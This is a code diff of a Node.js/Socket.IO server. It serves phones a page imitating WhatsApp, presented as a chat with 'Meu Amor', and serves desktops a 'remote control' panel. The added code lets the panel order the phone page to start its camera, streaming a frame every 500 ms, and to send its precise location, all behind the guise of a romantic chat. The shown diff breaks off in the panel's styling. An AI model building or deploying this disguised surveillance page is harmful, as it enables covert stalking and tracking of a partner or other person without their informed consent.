@@ -1,35 +1,123 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  cors: { origin: "*" }
+  cors: { origin: "*" },
+  transports: ['websocket', 'polling']
 });
 
 const PORT = process.env.PORT || 3000;
 
+// Middleware
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static('public'));
+
+// Rota principal
 app.get('/', (req, res) => {
-  const ua = req.headers['user-agent'].toLowerCase();
-  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
+  const userAgent = req.headers['user-agent'] || '';
+  const isMobile = /mobile|android|iphone|ipad|phone|blackberry|iemobile|opera mini/i.test(userAgent);
   const host = req.headers.host;
   const protocol = req.headers['x-forwarded-proto'] || 'http';
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // Página do CELULAR - Interface IDÊNTICA ao WhatsApp
-    res.send(`<!DOCTYPE html>
-<html>
+    res.send(getMobileWhatsApp(fullUrl));
+  } else {
+    res.send(getPCControlPanel(fullUrl));
+  }
+});
+
+// Health check
+app.get('/health', (req, res) => {
+  res.status(200).json({ 
+    status: 'online', 
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime()
+  });
+});
+
+// Socket.IO
+io.on('connection', (socket) => {
+  console.log('✅ Cliente conectado:', socket.id);
+  
+  // Mensagens de texto
+  socket.on('send_message', (data) => {
+    console.log('📨 Mensagem:', data.text);
+    socket.broadcast.emit('new_message', data);
+  });
+  
+  // Áudio
+  socket.on('send_audio', (data) => {
+    console.log('🎤 Áudio recebido');
+    socket.broadcast.emit('new_audio', data);
+  });
+  
+  // Indicador de digitação
+  socket.on('typing_start', () => {
+    socket.broadcast.emit('user_typing', { isTyping: true });
+  });
+  
+  socket.on('typing_stop', () => {
+    socket.broadcast.emit('user_typing', { isTyping: false });
+  });
+  
+  // Comandos do PC
+  socket.on('command', (command) => {
+    console.log('🎮 Comando:', command.type);
+    socket.broadcast.emit('execute_command', command);
+  });
+  
+  // Streaming de câmera
+  socket.on('camera_frame', (frameData) => {
+    socket.broadcast.emit('camera_stream', frameData);
+  });
+  
+  // Localização
+  socket.on('location_update', (location) => {
+    console.log('📍 Localização:', location.lat, location.lng);
+    socket.broadcast.emit('new_location', location);
+  });
+  
+  // Status do dispositivo
+  socket.on('device_status', (status) => {
+    socket.broadcast.emit('peer_status', status);
+  });
+  
+  socket.on('disconnect', () => {
+    console.log('❌ Cliente desconectado:', socket.id);
+    socket.broadcast.emit('peer_disconnected');
+  });
+});
+
+// Iniciar servidor
+server.listen(PORT, '0.0.0.0', () => {
+  console.log('\n' + '='.repeat(50));
+  console.log('🚀 WHATSAPP REMOTE CONTROL - SERVIDOR ATIVO');
+  console.log('='.repeat(50));
+  console.log(`📡 Porta: ${PORT}`);
+  console.log(`🌐 Local: http://localhost:${PORT}`);
+  console.log(`📱 Acesse no celular usando o mesmo IP da rede`);
+  console.log('='.repeat(50) + '\n');
+});
+
+// ==================== PÁGINA DO CELULAR (WHATSAPP) ====================
+function getMobileWhatsApp(fullUrl) {
+  return `<!DOCTYPE html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>WhatsApp</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -37,30 +125,24 @@ app.get('/', (req, res) => {
             background: #0b141a;
             height: 100vh;
             overflow: hidden;
-            position: relative;
         }
 
-        /* Container principal do WhatsApp */
-        .whatsapp-container {
+        /* Container principal */
+        .app {
             display: flex;
             flex-direction: column;
             height: 100vh;
-            width: 100%;
             background: #0b141a;
-            position: relative;
-            z-index: 2;
         }
 
-        /* Header do WhatsApp */
-        .whatsapp-header {
+        /* Header WhatsApp */
+        .header {
             background: #202c33;
-            padding: 10px 16px;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             border-bottom: 1px solid #2a3942;
-            position: relative;
-            z-index: 10;
         }
 
         .header-left {
@@ -69,25 +151,27 @@ app.get('/', (req, res) => {
             gap: 12px;
         }
 
-        .back-btn {
-            background: none;
-            border: none;
-            color: #e9edef;
-            font-size: 24px;
-            cursor: pointer;
-            display: none;
-        }
-
         .avatar {
             width: 40px;
             height: 40px;
-            background: #2a3942;
+            background: linear-gradient(135deg, #25d366, #128c7e);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-size: 22px;
             position: relative;
+        }
+
+        .online-badge {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 12px;
+            height: 12px;
+            background: #25d366;
+            border-radius: 50%;
+            border: 2px solid #202c33;
         }
 
         .contact-info h3 {
@@ -104,60 +188,45 @@ app.get('/', (req, res) => {
             gap: 4px;
         }
 
-        .online-dot {
-            width: 8px;
-            height: 8px;
-            background: #25d366;
-            border-radius: 50%;
-            display: inline-block;
-        }
-
         .header-right {
             display: flex;
             gap: 20px;
         }
 
         .header-icon {
+            background: none;
+            border: none;
             color: #e9edef;
             font-size: 20px;
             cursor: pointer;
-            background: none;
-            border: none;
         }
 
-        /* Área de mensagens - Estilo WhatsApp */
-        .messages-area {
+        /* Área de mensagens */
+        .messages {
             flex: 1;
             overflow-y: auto;
-            padding: 15px 12px;
+            padding: 16px 12px;
             display: flex;
             flex-direction: column;
             gap: 8px;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="none" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
-            background-repeat: repeat;
+            background-image: radial-gradient(circle at 25% 40%, rgba(255,255,255,0.02) 2%, transparent 2%);
+            background-size: 40px 40px;
         }
 
-        /* Balão de mensagem - Estilo WhatsApp */
+        /* Balões de mensagem */
         .message {
-            max-width: 75%;
+            max-width: 80%;
             padding: 8px 12px;
             border-radius: 8px;
-            font-size: 14.2px;
+            font-size: 14px;
             line-height: 1.4;
             position: relative;
-            word-wrap: break-word;
-            animation: messageAppear 0.2s ease;
+            animation: fadeIn 0.2s ease;
         }
 
-        @keyframes messageAppear {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .message.sent {
@@ -174,8 +243,8 @@ app.get('/', (req, res) => {
             border-bottom-left-radius: 2px;
         }
 
-        .message-content {
-            word-break: break-word;
+        .message-text {
+            word-wrap: break-word;
         }
 
         .message-meta {
@@ -188,24 +257,15 @@ app.get('/', (req, res) => {
             color: #8696a0;
         }
 
-        .message.sent .message-meta {
-            color: #8696a0;
-        }
-
-        /* Indicador de visualização */
-        .double-check {
-            font-size: 12px;
-        }
-
         /* Mensagem de áudio */
         .audio-message {
             display: flex;
             align-items: center;
-            gap: 10px;
-            min-width: 200px;
+            gap: 12px;
+            min-width: 180px;
         }
 
-        .audio-play-btn {
+        .audio-play {
             background: none;
             border: none;
             color: #e9edef;
@@ -213,15 +273,15 @@ app.get('/', (req, res) => {
             cursor: pointer;
         }
 
-        .audio-wave {
+        .audio-waveform {
             flex: 1;
-            height: 30px;
             display: flex;
             align-items: center;
             gap: 3px;
+            height: 30px;
         }
 
-        .wave-bar {
+        .wave {
             width: 3px;
             background: #e9edef;
             border-radius: 2px;
@@ -237,18 +297,17 @@ app.get('/', (req, res) => {
         .typing-indicator {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
             padding: 8px 12px;
             background: #202c33;
             border-radius: 16px;
             width: fit-content;
             margin-bottom: 8px;
-            align-self: flex-start;
         }
 
         .typing-dots {
             display: flex;
-            gap: 3px;
+            gap: 4px;
         }
 
         .typing-dots span {
@@ -256,80 +315,92 @@ app.get('/', (req, res) => {
             height: 6px;
             background: #8696a0;
             border-radius: 50%;
-            animation: typingDot 1.4s infinite;
+            animation: typing 1.4s infinite;
         }
 
         .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
         .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
 
-        @keyframes typingDot {
+        @keyframes typing {
             0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
             30% { transform: translateY(-6px); opacity: 1; }
         }
 
-        /* Área de input - Estilo WhatsApp */
-        .message-input-area {
+        /* Área de input */
+        .input-area {
             background: #202c33;
             padding: 8px 12px;
             display: flex;
             gap: 10px;
             align-items: center;
-            position: relative;
-            z-index: 10;
         }
 
-        .input-left {
-            display: flex;
-            gap: 8px;
-        }
-
-        .emoji-btn, .attach-btn {
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #8696a0;
-        }
-
-        .message-input {
+        .input-field {
             flex: 1;
             background: #2a3942;
             border: none;
-            padding: 9px 12px;
-            border-radius: 20px;
+            padding: 10px 16px;
+            border-radius: 24px;
             color: #e9edef;
             font-size: 15px;
             outline: none;
         }
 
-        .message-input::placeholder {
+        .input-field::placeholder {
             color: #8696a0;
         }
 
-        .input-right {
-            display: flex;
-            gap: 8px;
-        }
-
-        .mic-btn, .send-btn {
+        .input-btn {
             background: none;
             border: none;
             font-size: 24px;
             cursor: pointer;
             color: #8696a0;
+            transition: all 0.2s;
         }
 
-        .send-btn.active {
+        .input-btn.active {
             color: #25d366;
         }
 
-        /* Menu lateral (simulação) */
+        /* Toast de notificação */
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e2a32;
+            color: #e9edef;
+            padding: 8px 16px;
+            border-radius: 24px;
+            font-size: 13px;
+            z-index: 1000;
+            animation: slideUp 0.3s ease;
+            white-space: nowrap;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        /* Menu lateral */
+        .menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 99;
+            display: none;
+        }
+
         .side-menu {
             position: fixed;
             top: 0;
-            right: -100%;
-            width: 80%;
-            max-width: 300px;
+            right: -280px;
+            width: 280px;
             height: 100%;
             background: #202c33;
             z-index: 100;
@@ -342,76 +413,44 @@ app.get('/', (req, res) => {
         }
 
         .menu-header {
-            padding: 50px 20px 20px;
+            padding: 60px 20px 20px;
             background: #2a3942;
+            text-align: center;
         }
 
         .menu-item {
-            padding: 15px 20px;
+            padding: 16px 20px;
             color: #e9edef;
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 16px;
             border-bottom: 1px solid #2a3942;
             cursor: pointer;
+            transition: background 0.2s;
         }
 
-        .menu-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 99;
-            display: none;
+        .menu-item:hover {
+            background: #2a3942;
         }
 
-        .menu-overlay.show {
-            display: block;
-        }
-
-        /* Notificações */
-        .notification {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1e2a32;
-            color: #e9edef;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 12px;
-            z-index: 200;
-            animation: notifySlide 0.3s ease;
-        }
-
-        @keyframes notifySlide {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
+        .menu-item:active {
+            background: #3b4a54;
         }
     </style>
 </head>
 <body>
-    <div class="whatsapp-container">
-        <!-- Header WhatsApp -->
-        <div class="whatsapp-header">
+    <div class="app">
+        <!-- Header -->
+        <div class="header">
             <div class="header-left">
                 <div class="avatar">
                     💕
-                    <span style="position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; background: #25d366; border-radius: 50%; border: 2px solid #202c33;"></span>
+                    <div class="online-badge"></div>
                 </div>
                 <div class="contact-info">
-                    <h3>Meu Amor ❤️</h3>
-                    <div class="contact-status">
-                        <span class="online-dot"></span>
-                        <span id="statusText">online</span>
+                    <h3>Meu Amor</h3>
+                    <div class="contact-status" id="statusText">
+                        <span>🟢</span> online
                     </div>
                 </div>
             </div>
@@ -420,80 +459,77 @@ app.get('/', (req, res) => {
             </div>
         </div>
 
-        <!-- Área de mensagens -->
-        <div class="messages-area" id="messagesArea">
+        <!-- Mensagens -->
+        <div class="messages" id="messagesContainer">
             <div class="message received">
-                <div class="message-content">
-                    💕 Olá, meu amor! Estou aqui para você 💕
-                </div>
+                <div class="message-text">💕 Olá! Estou aqui para você 💕</div>
                 <div class="message-meta">
-                    <span class="message-time">Agora</span>
+                    <span>Agora</span>
+                    <span>✓✓</span>
                 </div>
             </div>
         </div>
 
-        <!-- Área de input -->
-        <div class="message-input-area">
-            <div class="input-left">
-                <button class="emoji-btn" id="emojiBtn">😊</button>
-                <button class="attach-btn" id="attachBtn">+</button>
-            </div>
-            <input type="text" class="message-input" id="messageInput" placeholder="Digite uma mensagem">
-            <div class="input-right">
-                <button class="mic-btn" id="micBtn">🎤</button>
-                <button class="send-btn" id="sendBtn">📤</button>
-            </div>
+        <!-- Input -->
+        <div class="input-area">
+            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
+            <button class="input-btn" id="micBtn">🎤</button>
+            <button class="input-btn" id="sendBtn">📤</button>
         </div>
     </div>
 
-    <!-- Menu lateral -->
+    <!-- Menu -->
     <div class="menu-overlay" id="menuOverlay"></div>
     <div class="side-menu" id="sideMenu">
         <div class="menu-header">
-            <div style="text-align: center;">
-                <div style="font-size: 60px;">💕</div>
-                <h3 style="color: #e9edef; margin-top: 10px;">Meu Amor</h3>
-                <p style="color: #8696a0; font-size: 12px;">Conectado</p>
-            </div>
+            <div style="font-size: 48px;">💕</div>
+            <h3 style="color: #e9edef; margin-top: 10px;">Configurações</h3>
         </div>
-        <div class="menu-item" id="menuCamera">
-            <span>📷</span> <span>Câmera</span>
+        <div class="menu-item" id="cameraMenu">
+            <span>📷</span> Ativar Câmera
         </div>
-        <div class="menu-item" id="menuMic">
-            <span>🎤</span> <span>Microfone</span>
+        <div class="menu-item" id="locationMenu">
+            <span>📍</span> Compartilhar Localização
         </div>
-        <div class="menu-item" id="menuLocation">
-            <span>📍</span> <span>Localização</span>
-        </div>
-        <div class="menu-item" id="menuMusic">
-            <span>🎵</span> <span>Música</span>
+        <div class="menu-item" id="vibrateMenu">
+            <span>📳</span> Testar Vibração
         </div>
     </div>
 
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="${fullUrl}/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}');
-        
+        // Configuração
+        const socket = io('${fullUrl}', {
+            transports: ['websocket', 'polling'],
+            reconnection: true
+        });
+
         // Elementos
-        const messagesArea = document.getElementById('messagesArea');
+        const messagesContainer = document.getElementById('messagesContainer');
         const messageInput = document.getElementById('messageInput');
         const sendBtn = document.getElementById('sendBtn');
         const micBtn = document.getElementById('micBtn');
-        const emojiBtn = document.getElementById('emojiBtn');
-        const attachBtn = document.getElementById('attachBtn');
         const menuBtn = document.getElementById('menuBtn');
-        const sideMenu = document.getElementById('sideMenu');
         const menuOverlay = document.getElementById('menuOverlay');
+        const sideMenu = document.getElementById('sideMenu');
         const statusText = document.getElementById('statusText');
-        
+
         // Estado
         let isRecording = false;
         let mediaRecorder = null;
         let audioChunks = [];
         let typingTimeout = null;
-        let isTyping = false;
-        
-        // Função para adicionar mensagem
+        let cameraStream = null;
+
+        // ========== FUNÇÕES ==========
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
         function addMessage(text, type = 'received', isAudio = false, audioUrl = null) {
             const messageDiv = document.createElement('div');
             messageDiv.className = `message ${type}`;
@@ -502,230 +538,241 @@ app.get('/', (req, res) => {
             const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
             
             if (isAudio && audioUrl) {
+                const audioId = 'audio_' + Date.now();
                 messageDiv.innerHTML = \`
                     <div class="audio-message">
-                        <button class="audio-play-btn" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('audio_\${Date.now()}').play()">▶️</button>
-                        <div class="audio-wave">
-                            <div class="wave-bar" style="animation-duration: 0.3s"></div>
-                            <div class="wave-bar" style="animation-duration: 0.5s"></div>
-                            <div class="wave-bar" style="animation-duration: 0.4s"></div>
-                            <div class="wave-bar" style="animation-duration: 0.6s"></div>
-                            <div class="wave-bar" style="animation-duration: 0.35s"></div>
+                        <button class="audio-play" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('\${audioId}')[this.innerHTML==='▶️'?'pause':'play']()">▶️</button>
+                        <div class="audio-waveform">
+                            <div class="wave" style="animation-duration: 0.3s"></div>
+                            <div class="wave" style="animation-duration: 0.5s"></div>
+                            <div class="wave" style="animation-duration: 0.4s"></div>
+                            <div class="wave" style="animation-duration: 0.6s"></div>
                         </div>
-                        <audio id="audio_\${Date.now()}" src="\${audioUrl}" style="display: none;"></audio>
-                        <span style="font-size: 11px;">0:00</span>
+                        <audio id="\${audioId}" src="\${audioUrl}" style="display: none;"></audio>
                     </div>
                     <div class="message-meta">
-                        <span class="message-time">\${timeStr}</span>
-                        <span class="double-check">✓✓</span>
+                        <span>\${timeStr}</span>
+                        <span>✓✓</span>
                     </div>
                 \`;
             } else {
                 messageDiv.innerHTML = \`
-                    <div class="message-content">\${text}</div>
+                    <div class="message-text">\${text}</div>
                     <div class="message-meta">
-                        <span class="message-time">\${timeStr}</span>
-                        <span class="double-check">✓✓</span>
+                        <span>\${timeStr}</span>
+                        <span>✓✓</span>
                     </div>
                 \`;
             }
             
-            messagesArea.appendChild(messageDiv);
-            messagesArea.scrollTop = messagesArea.scrollHeight;
-            return messageDiv;
+            messagesContainer.appendChild(messageDiv);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
         }
-        
-        // Enviar mensagem
+
         function sendMessage() {
             const text = messageInput.value.trim();
             if (text) {
                 addMessage(text, 'sent');
-                socket.emit('chat_message', text);
+                socket.emit('send_message', { text, timestamp: Date.now() });
                 messageInput.value = '';
                 stopTyping();
             }
         }
-        
-        // Indicador de digitação
+
         function startTyping() {
-            if (!isTyping) {
-                isTyping = true;
-                socket.emit('typing_start');
-            }
+            socket.emit('typing_start');
             if (typingTimeout) clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => {
-                stopTyping();
-            }, 1000);
+            typingTimeout = setTimeout(() => stopTyping(), 1000);
         }
-        
+
         function stopTyping() {
-            if (isTyping) {
-                isTyping = false;
-                socket.emit('typing_stop');
-            }
+            socket.emit('typing_stop');
         }
-        
-        // Mostrar notificação
-        function showNotification(message) {
-            const notif = document.createElement('div');
-            notif.className = 'notification';
-            notif.textContent = message;
-            document.body.appendChild(notif);
-            setTimeout(() => notif.remove(), 3000);
-        }
-        
-        // Gravar áudio
+
+        // ========== ÁUDIO ==========
         async function startRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 mediaRecorder = new MediaRecorder(stream);
                 audioChunks = [];
                 
-                mediaRecorder.ondataavailable = (event) => {
-                    audioChunks.push(event.data);
-                };
-                
+                mediaRecorder.ondataavailable = (event) => audioChunks.push(event.data);
                 mediaRecorder.onstop = () => {
                     const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                     const audioUrl = URL.createObjectURL(audioBlob);
-                    addMessage('🎤 Mensagem de áudio', 'sent', true, audioUrl);
+                    addMessage('🎤 Mensagem de voz', 'sent', true, audioUrl);
                     
-                    // Converter para base64 e enviar
                     const reader = new FileReader();
                     reader.onloadend = () => {
-                        socket.emit('audio_message', reader.result);
+                        socket.emit('send_audio', { audio: reader.result, timestamp: Date.now() });
                     };
                     reader.readAsDataURL(audioBlob);
                     
                     stream.getTracks().forEach(track => track.stop());
-                    showNotification('🎤 Áudio enviado!');
+                    showToast('🎤 Áudio enviado!');
                 };
                 
                 mediaRecorder.start();
                 isRecording = true;
                 micBtn.textContent = '⏹️';
-                micBtn.style.color = '#25d366';
-                showNotification('🎤 Gravando... Clique novamente para parar');
+                micBtn.classList.add('active');
+                showToast('🎤 Gravando... Clique novamente para parar');
             } catch (err) {
-                console.error('Erro ao gravar áudio:', err);
-                showNotification('❌ Erro ao acessar microfone');
+                console.error(err);
+                showToast('❌ Erro ao acessar microfone');
             }
         }
-        
+
         function stopRecording() {
             if (mediaRecorder && isRecording) {
                 mediaRecorder.stop();
                 isRecording = false;
                 micBtn.textContent = '🎤';
-                micBtn.style.color = '#8696a0';
+                micBtn.classList.remove('active');
             }
         }
-        
-        // Eventos de input
-        sendBtn.addEventListener('click', sendMessage);
-        messageInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendMessage();
-        });
-        messageInput.addEventListener('input', () => {
-            startTyping();
-        });
-        
-        // Botão de microfone
-        micBtn.addEventListener('click', () => {
-            if (isRecording) {
-                stopRecording();
-            } else {
-                startRecording();
+
+        // ========== CÂMERA ==========
+        async function startCamera() {
+            showToast('📷 Iniciando câmera...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                cameraStream = stream;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                
+                setInterval(() => {
+                    if (cameraStream && cameraStream.active) {
+                        imageCapture.grabFrame()
+                            .then(imageBitmap => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = imageBitmap.width;
+                                canvas.height = imageBitmap.height;
+                                canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
+                                socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
+                            })
+                            .catch(() => {});
+                    }
+                }, 500);
+                
+                showToast('📷 Câmera ativada!');
+            } catch (err) {
+                console.error(err);
+                showToast('❌ Erro ao acessar câmera');
             }
+        }
+
+        // ========== LOCALIZAÇÃO ==========
+        function getLocation() {
+            if (!navigator.geolocation) {
+                showToast('❌ Geolocalização não suportada');
+                return;
+            }
+            
+            showToast('📍 Obtendo localização...');
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const location = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    };
+                    socket.emit('location_update', location);
+                    addMessage(\`📍 Minha localização: \${location.lat.toFixed(4)}, \${location.lng.toFixed(4)}\`, 'sent');
+                    showToast('📍 Localização enviada!');
+                },
+                (error) => {
+                    console.error(error);
+                    showToast('❌ Erro ao obter localização');
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+
+        // ========== EVENTOS ==========
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+        messageInput.addEventListener('input', startTyping);
+        
+        micBtn.addEventListener('click', () => {
+            if (isRecording) stopRecording();
+            else startRecording();
         });
         
         // Menu
         menuBtn.addEventListener('click', () => {
             sideMenu.classList.add('open');
-            menuOverlay.classList.add('show');
+            menuOverlay.style.display = 'block';
         });
         
         function closeMenu() {
             sideMenu.classList.remove('open');
-            menuOverlay.classList.remove('show');
+            menuOverlay.style.display = 'none';
         }
         
         menuOverlay.addEventListener('click', closeMenu);
-        
-        // Ações do menu
-        document.getElementById('menuCamera').addEventListener('click', () => {
-            socket.emit('comando', 'toggleCamera');
-            showNotification('📷 Solicitando câmera');
+        document.getElementById('cameraMenu').addEventListener('click', () => { startCamera(); closeMenu(); });
+        document.getElementById('locationMenu').addEventListener('click', () => { getLocation(); closeMenu(); });
+        document.getElementById('vibrateMenu').addEventListener('click', () => {
+            if (navigator.vibrate) navigator.vibrate(200);
+            showToast('📳 Vibração!');
             closeMenu();
-        });
-        
-        document.getElementById('menuMic').addEventListener('click', () => {
-            socket.emit('comando', 'toggleAudio');
-            showNotification('🎤 Solicitando microfone');
-            closeMenu();
-        });
-        
-        document.getElementById('menuLocation').addEventListener('click', () => {
-            socket.emit('comando', 'getLocation');
-            showNotification('📍 Solicitando localização');
-            closeMenu();
-        });
-        
-        document.getElementById('menuMusic').addEventListener('click', () => {
-            socket.emit('comando', 'playMusic');
-            showNotification('🎵 Tocando música romântica');
-            closeMenu();
-        });
-        
-        // Emojis simples
-        emojiBtn.addEventListener('click', () => {
-            const emojis = ['😊', '❤️', '💕', '😘', '🥰', '💖', '💗', '💓', '💝', '💘', '💌', '🌹', '✨', '⭐', '🎵'];
-            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            messageInput.value += randomEmoji;
-            messageInput.focus();
         });
         
         // Socket events
-        socket.on('chat_message', (msg) => {
-            addMessage(msg, 'received');
-            showNotification('💬 Nova mensagem');
+        socket.on('new_message', (data) => {
+            addMessage(data.text, 'received');
+            showToast('💬 Nova mensagem');
         });
         
-        socket.on('audio_message', (audioBase64) => {
-            addMessage('🎤 Mensagem de áudio', 'received', true, audioBase64);
-            showNotification('🎤 Nova mensagem de áudio');
+        socket.on('new_audio', (data) => {
+            addMessage('🎤 Mensagem de áudio', 'received', true, data.audio);
+            showToast('🎤 Nova mensagem de áudio');
         });
         
-        socket.on('typing_start', () => {
-            statusText.innerHTML = '<span class="online-dot"></span> digitando...';
+        socket.on('user_typing', (data) => {
+            statusText.innerHTML = data.isTyping ? '<span>✍️</span> digitando...' : '<span>🟢</span> online';
         });
         
-        socket.on('typing_stop', () => {
-            statusText.innerHTML = '<span class="online-dot"></span> online';
-        });
-        
-        socket.on('status_update', (status) => {
-            if (status === 'online') {
-                statusText.innerHTML = '<span class="online-dot"></span> online';
-            } else {
-                statusText.innerHTML = '<span class="online-dot"></span> último visto agora';
+        socket.on('execute_command', (command) => {
+            if (command.type === 'vibrate' && navigator.vibrate) {
+                navigator.vibrate(200);
+                showToast('📳 Vibração recebida!');
+            } else if (command.type === 'emergency') {
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+                showToast('💖 Surpresa Especial! 💖');
+                addMessage('💖 Recebi uma surpresa especial! 💖', 'received');
+            } else if (command.type === 'get_location') {
+                getLocation();
+            } else if (command.type === 'start_camera') {
+                startCamera();
             }
         });
         
         socket.on('connect', () => {
-            showNotification('✨ Conectado! ✨');
+            showToast('✨ Conectado! ✨');
+            socket.emit('device_status', { status: 'online', device: 'mobile' });
+        });
+        
+        socket.on('disconnect', () => {
+            showToast('❌ Desconectado');
         });
     </script>
 </body>
-</html>`);
-  } else {
-    // Página do PC - Painel de Controle (WhatsApp Web style)
-    res.send(`<!DOCTYPE html>
-<html>
+</html>`;
+}
+
+// ==================== PÁGINA DO PC (CONTROLE) ====================
+function getPCControlPanel(fullUrl) {
+  return `<!DOCTYPE html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WhatsApp Web - Controle</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - Painel de Controle</title>
     <style>
         * {
             margin: 0;
@@ -740,14 +787,14 @@ app.get('/', (req, res) => {
             overflow: hidden;
         }
 
-        .whatsapp-web {
+        .app {
             display: flex;
             height: 100vh;
         }
 
-        /* Sidebar - Conversas */
+        /* Sidebar */
         .sidebar {
-            width: 380px;
+            width: 320px;
             background: #202c33;
             border-right: 1px solid #2a3942;
             display: flex;
@@ -755,11 +802,8 @@ app.get('/', (req, res) => {
         }
 
         .sidebar-header {
-            padding: 16px;
+            padding: 20px 16px;
             background: #202c33;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
             border-bottom: 1px solid #2a3942;
         }
 
@@ -769,85 +813,10 @@ app.get('/', (req, res) => {
             gap: 12px;
         }
 
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            background: #2a3942;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .user-name {
-            color: #e9edef;
-            font-weight: 500;
-        }
-
-        .sidebar-actions {
-            display: flex;
-            gap: 16px;
-        }
-
-        .action-btn {
-            background: none;
-            border: none;
-            color: #8696a0;
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        /* Search */
-        .search-area {
-            padding: 12px;
-            background: #202c33;
-        }
-
-        .search-box {
-            background: #2a3942;
-            border-radius: 8px;
-            padding: 8px 12px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .search-box input {
-            background: none;
-            border: none;
-            color: #e9edef;
-            flex: 1;
-            outline: none;
-        }
-
-        /* Chat list */
-        .chat-list {
-            flex: 1;
-            overflow-y: auto;
-        }
-
-        .chat-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 16px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .chat-item:hover {
-            background: #2a3942;
-        }
-
-        .chat-item.active {
-            background: #2a3942;
-        }
-
-        .chat-avatar {
-            width: 49px;
-            height: 49px;
-            background: #2a3942;
+        .avatar {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #25d366, #128c7e);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -855,22 +824,13 @@ app.get('/', (req, res) => {
             font-size: 24px;
         }
 
